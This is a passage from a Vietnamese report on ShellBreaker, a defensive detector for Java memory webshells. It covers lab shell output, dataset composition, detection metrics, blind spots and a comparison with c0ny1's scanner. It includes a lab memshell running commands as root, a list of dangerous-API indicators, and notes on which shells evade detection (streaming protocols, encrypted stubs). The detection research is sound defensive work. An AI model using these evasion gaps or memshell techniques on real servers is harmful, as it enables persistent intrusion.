  rules=[iface:Filter, api:start, no_source_attr, no_backing_file, no_code_source]
  loader=PayloadLoader@3a4b5c6d
  extracted=/extracted/com/evil/MemFilter_1748123456789.class
```

**Tóm tắt so sánh hai detection path:**

| | File-based JSP | Fileless Bytecode |
|--|--------------|-----------------|
| Viết file vào target disk? | Có (JSP + class) | Không bao giờ |
| File-watcher bắt được? | Có | Không |
| Java Agent bắt được? | Có (khi class load) | Có (trong `transform()`) |
| Verdict | MEDIUM/HIGH | HIGH (score=12) |
| Extracted để phân tích? | Có (từ work dir) | Có (dump từ RAM) |

```bash
# Interactive shell fileless
./lab.sh fileless-shell
fileless-memshell$ whoami
root
fileless-memshell$ cat /etc/hostname
memshell-tomcat
```

**Kiểm tra agent đã bắt:**
```bash
./lab.sh agent-status
# → [HIGH     ] com/evil/MemFilter  score=12  rules=['iface:Filter', 'api:start', ...]
```

---

## 7. Kết quả thực nghiệm

### 7.1 Dataset (v5.0 — ResNet50 era, signal-filtered)

Dataset được rebuild với signal filter 17 indicators. Nguồn webshell theo paper GAShellBreaker Table 5: tennc/Webshell, xl7dev/Webshell, threedr3am/JSP-Webshells, gxu-yuan/ysrc-back (291 raw JSPs, compile qua lab Tomcat khi cần).

| Category | Số lượng | Dùng cho |
|----------|---------|---------|
| `webshell_file` | 876 | Train + Test (80/20 stratified, 3 runs) |
| `webshell_fileless` | **82** → **80 PNG** | **Test only** — không bao giờ train |
| `benign` (training) | 4,994 khả dụng; **2,000 sampled** | Train + Test |
| `benign_test` | 500 → **463 PNG** | **Test only** — Maven Central, domain mới |

**Thành phần fileless test set (82 mẫu) theo loại memshell:**

| Loại memshell | Số mẫu | Nguồn |
|---|---|---|
| Filter (javax/jakarta Servlet Filter) | 27 | java-memshell-generator, changheluor007/MemShell |
| Listener (ServletRequestListener, etc.) | 24 | java-memshell-generator, MemoryShellLearn |
| Servlet / HttpServlet | 6 | changheluor007/MemShell |
| Spring Interceptor (HandlerInterceptor) | 5 | su18/MemoryShell, MemoryShellLearn |
| Tomcat Valve (ValveBase) | 4 | java-memshell-generator |
| ClassLoader / defineClass helper | 3 | changheluor007/MemShell |
| Agent / ClassFileTransformer | 2 | rebeyond/memShell, java-memshell-generator |
| Spring Controller (@RequestMapping) | 2 | su18/MemoryShell |
| WebSocket Endpoint | 1 | wsMemShell |
| **Tổng** | **82** | 6 repo nguồn khác nhau |

Fileless test set bao phủ đầy đủ 9 loại injection vector khác nhau: Filter, Listener, Servlet, Spring Interceptor, Tomcat Valve, ClassLoader, Agent/ClassFileTransformer, Spring Controller, và WebSocket Endpoint. Mô hình **không bao giờ thấy bất kỳ mẫu fileless nào trong quá trình training** — toàn bộ 82 mẫu đều là zero-shot generalization test.

**Signal filter** giữ lại class có ít nhất một trong 17 indicators (raw bytes scan):
- HTTP handler: `servlet/Filter`, `servlet/Servlet`, `catalina/Valve`, `HandlerInterceptor`, `websocket/Endpoint`, `ChannelHandler`
- Command exec: `java/lang/Runtime`, `ProcessBuilder`
- Dynamic class: `defineClass`, `defineAnonymousClass`
- Script engine: `ScriptEngine`, `GroovyClassLoader`, `JavaCompiler`
- Remote class: `URLClassLoader`
- Unsafe: `sun/misc/Unsafe`, `jdk/internal/misc/Unsafe`

### 7.2 Kết quả ResNet50 (Colab T4, 3-run average, threshold 0.50)

| Metric | Value |
|--------|-------|
| Accuracy | **0.9925** ±0.0059 |
| Precision | **0.9925** ±0.0072 |
| Recall | **0.9898** ±0.0068 |
| F1 | **0.9911** ±0.0070 |
| AUC-ROC | **0.9988** ±0.0014 |

So sánh với paper gốc và legacy XGBoost:

| Model | Dataset | Precision | Recall | F1 | AUC |
|---|---|---|---|---|---|
| GAShellBreaker (paper) | 383+968 | 0.9913 | 0.9830 | 0.9870 | — |
| XGBoost v4.0 (legacy) | 876+4136 | 1.000 | 0.970 | 0.985 | 0.999 |
| **ResNet50 v5.0 (current)** | 876+2000 | **0.9925** | **0.9898** | **0.9911** | **0.9988** |

### 7.3 Held-out test: ML-only vs Rule-only vs Hybrid (80 fileless + 463 benign_test)

| Method | Accuracy | Precision | Recall | F1 | FPR |
|--------|----------|-----------|--------|-----|-----|
| ML only (ResNet50 ≥0.50) | 0.901 | 1.000 | 0.325 | 0.491 | 0.000 |
| Rule only (score ≥2) | **1.000** | **1.000** | **1.000** | **1.000** | **0.000** |
| **Hybrid rule-first** | **1.000** | **1.000** | **1.000** | **1.000** | **0.000** |

**Hybrid verdict breakdown (80 fileless):**
- **CONFIRMED**: 76 (95%) — rule HIGH, gửi email + Splunk ngay
- **MEDIUM**: 4 (5%) — rule MEDIUM, queue analyst review
- **BENIGN**: 0

**Nhận xét:**

- ML recall=0.325 trên fileless: ResNet50 train trên file-based JSP webshell — opcode pattern của fileless memshell khác đáng kể (nhiều `invokevirtual` component registration, ít `ldc` string constants). Zero-shot test hoàn toàn có chủ đích.
- Rule recall=1.000, FPR=0.000: Mọi fileless webshell đều implement interface known (Filter/Servlet/Valve/Agent) hoặc gọi `defineClass` — rule engine bắt tất cả, không FP nào.
- **Rule-first verdict (v2.0)**: Vì rule FPR=0 trên test set, đổi từ "rule HIGH AND ml≥0.50" thành "rule HIGH alone" → 95% fileless được CONFIRMED thay vì 30%.

### 7.4 So sánh với baseline

| Tool | Approach | Recall (fileless) | FPR |
|------|----------|-------------------|-----|
| copagent | Rule-based (runtime) | ~0.70 | Thấp |
| JShellDetector (Song et al.) | Dynamic taint | ~0.80 | Thấp |
| OpenRASP | RASP hooking | ~0.80 | Trung bình |
| GAShellBreaker (paper) | ResNet50 + monitoring | 0.893 | — |
| **ShellBreaker ML only** | ResNet50 static | 0.325 | **0.000** |
| **ShellBreaker Rule only** | Rule static | **1.000** | **0.000** |
| **ShellBreaker Hybrid rule-first** | ResNet50 + Rule | **1.000** | **0.000** |
| **ShellBreaker + Agent** | Hybrid + Runtime | **~1.000** | Thấp |

---

## 8. Phân tích điểm mù của mô hình

### 8.1 Dataset contamination — Đã được khắc phục (v4.0)

Phiên bản cũ có vấn đề nghiêm trọng: copagent (defensive scanner), ysoserial/marshalsec (gadget chain, không phải webshell), và utility class từ java-memshell-generator được gán nhãn webshell nhầm. Sau khi phân tích, tỉ lệ nhiễu ước tính:

- `webshell_file`: ~77.8% là class không phải webshell thực
- `webshell_fileless`: ~35.6% là utility/scanner class bị gán nhãn sai

**v4.0 đã khắc phục hoàn toàn** bằng hai cơ chế:
1. **Loại bỏ repo không liên quan**: copagent, ysoserial, marshalsec, ysomap, Godzilla framework, Behinder → không còn trong nguồn dữ liệu
2. **Signal filter 17 indicators**: Mỗi `.class` phải chứa ít nhất một byte pattern malicious (raw scan, không cần decompile)

Kết quả: dataset tăng từ 514 → **876 webshell_file thực** (+70%), không còn utility class nhiễu.

### 8.2 Điểm mù thực sự tồn tại

**1. Large streaming-protocol shells (Godzilla, Behinder raw stream handlers)**

Class có 1000+ opcodes — malicious core bị pha loãng bởi hàng trăm opcode I/O hợp lệ (`getfield`, `aload`, `invokevirtual` trên InputStream/OutputStream). ML score hạ xuống ~0.32 vì model nhìn thấy distribution gần benign.

Ví dụ field names gặp: `gInStream`, `gOutStream`, `headerName` — Godzilla streaming protocol. Không có string constant nào trong constant pool (encrypted/obfuscated).

Rule engine bắt được nếu class implement interface known (Filter/Servlet), nhưng nếu attacker dùng interface không có trong danh sách thì cả hai đều miss.

**2. Encrypted/packed stubs**

Class chỉ có logic decrypt: nhận byte array từ nơi khác, call `defineClass`. Stub itself trông như một deserializer hợp lệ. Rule engine chỉ bắt được nếu thấy `defineClass` được gọi trực tiếp — indirect via reflection thêm một hop nữa.

**3. Files quá nhỏ (< 4 opcodes)**

4 file bị skip bởi cả ML và rule. Đây là interface declaration hoặc annotation class không có body — không có nguy cơ thực sự.

**4. Non-standard JVM languages**

Kotlin/Scala webshell compile ra opcode idiom khác (nhiều `checkcast`, `ldc` class, SAM wrapper). Model chỉ train trên Java-compiled bytecode. Không có sample nào trong dataset hiện tại.

### 8.3 Java Agent giải quyết một phần

Với Java Agent, `no_backing_file` và `no_code_source` check không phụ thuộc vào opcode content. Ngay cả Godzilla streaming shell sẽ bị flag ở score ≥ 2 nếu nó:
- Không có backing `.class` file (inject từ RAM)
- Implement bất kỳ servlet interface nào

Đây là lý do Hybrid + Agent đạt recall ~100% trên điều kiện lab.

---

## 9. Rule-based: so sánh với c0ny1

### 9.1 Kiến trúc

| Chiều | ShellBreaker Python rule | ShellBreaker Java Agent rule | c0ny1/java-memshell-scanner |
|-------|------------------------|------------------------------|------------------------------|
| **Môi trường** | Ngoài JVM, phân tích file | Trong JVM, ClassFileTransformer | Trong JVM, scan toàn heap |
| **Input** | Output `javap` (text) | Raw bytecode qua ASM | Class objects trong JVM memory |
| **Thời điểm** | Static (trước khi class load) | Tại thời điểm class load | Sau khi inject xảy ra |
| **Anonymous class** | Không detect | Detect qua transform() | Detect qua getAllLoadedClasses() |
| **ClassLoader provenance** | Không check | Check no_backing_file | Full ClassLoader chain walk |
| **Vai trò** | Prevention + ML booster | Realtime intercept | Incident response scanner |

### 9.2 c0ny1 vẫn kiểm tra sâu hơn ở một số điểm

```java
// c0ny1 walk toàn bộ class hierarchy trong JVM
for (Class<?> clazz : instrumentation.getAllLoadedClasses()) {
    // Check ClassLoader provenance — class load từ đâu?
    ClassLoader cl = clazz.getClassLoader();
    if (cl instanceof URLClassLoader || isAnonymousLoader(cl)) { ... }

    // Check CodeSource
    CodeSource cs = clazz.getProtectionDomain().getCodeSource();
    if (cs == null) { /* anonymous/injected class */ }

    // Thread inspection — scan running threads
    // Known tool family signatures (Godzilla, Behinder...)
}
```

ShellBreaker agentmain cũng retransform tất cả đã-loaded class, nhưng chỉ thông qua bytecode analysis — không walk class hierarchy hay inspect thread stack.

### 9.3 Improvements so với c0ny1 baseline

| Tính năng | c0ny1 | ShellBreaker Rule |
|-----------|-------|-----------------|
| Interface coverage | Servlet/Filter/Valve | Servlet + Valve + Spring + WebSocket + Netty + Agent |
| Dangerous APIs | Runtime.exec | +ProcessBuilder, Unsafe, ScriptEngine, Groovy, Javassist, BCEL, RMI |
| ASM-based (không subprocess) | Không | Có — nhanh hơn, không phụ thuộc javap |
| Score-based | Không | Có — weighted scoring system |
| Obfuscation detection | Một phần | Short classname ≤3 chars, no SourceFile |
| Dynamic proxy detection | Không | `Proxy.newProxyInstance` pattern |
| ML integration | Không | Có — rule score + ML score → combined verdict |

---

## 10. Hạn chế và hướng phát triển

### 10.1 Hạn chế hiện tại

| Hạn chế | Nguyên nhân | Impact |
|---------|-------------|--------|
| ML recall thấp trên fileless | Chưa train trên fileless webshell (by design) | Rule layer bù đắp hoàn toàn (Hybrid R=1.000) |
| ~~Dataset contamination~~ | ✅ Đã fix trong v4.0 — signal filter | — |
| Large streaming shell bypass ML | Opcode distribution bị pha loãng | Rule engine cần biết interface |
| Encrypted stub | Logic decrypt giống deserializer | Cần behavioral analysis |
| Non-Java JVM language | Kotlin/Scala opcode idiom khác | Không có sample trong dataset |
| Phụ thuộc javap | Cần JDK 21 (file-watcher path) | Java Agent path không phụ thuộc |

### 10.2 Hướng cải thiện ngắn hạn

1. ~~**Làm sạch dataset**~~: ✅ **Đã hoàn thành (v4.0)** — signal filter 17 indicators + loại bỏ repo nhiễu
2. ~~**Thêm fileless vào training**~~: ✅ **Một phần** — 82 fileless test shells (9 loại memshell), fileless vẫn kept out of training (per design). Hybrid rule layer đạt Recall=1.000 trên toàn bộ 82 mẫu.
3. ~~**Forensic event enrichment**~~: ✅ **Đã hoàn thành (v4.1)** — mọi detection event trong `detections.jsonl` giờ gồm đầy đủ:
   - `injection_type`, `injection_subtype` (từ rule hits `iface:*`)
   - `trigger_hook` (premain / agentmain / file-watcher path)
   - `thread_name`, `codesource_url`, `call_stack` (từ Java Agent tại thời điểm inject)
   - `has_runtime_exec`, `has_define_class`, `has_reflection` (boolean indicators)
   - `top_opcodes` (top 10), `top_bigrams` (top 5)
   - `javap_excerpt` (60 dòng đầu của disassembly)
4. **Mở rộng rule interface list**: Thêm Godzilla/Behinder streaming handler interface names
5. **Splunk dashboard**: Timeline chart + alert correlation để visualize attack chain
6. **Tối ưu feature extraction**: Hiện tại `javap` subprocess mỗi file mất ~0.5s → 5,930 files = 55 phút. Cần cache hoặc dùng ASM trực tiếp trong Python (qua Jython hoặc jpype)

### 10.3 Hướng cải thiện dài hạn

1. **Behavioral analysis**: Theo dõi class execution sau khi load — gọi `defineClass` sau 100ms → suspicious
2. **Graph-based detection**: Model opcode flow graph thay vì bag-of-bigrams
3. **Periodic agentmain scan**: Cron job retrigger agentmain mỗi N phút để bắt injection muộn
4. **JVMTI integration**: Thay Instrumentation API bằng JVMTI C agent để giảm overhead và tăng stealth
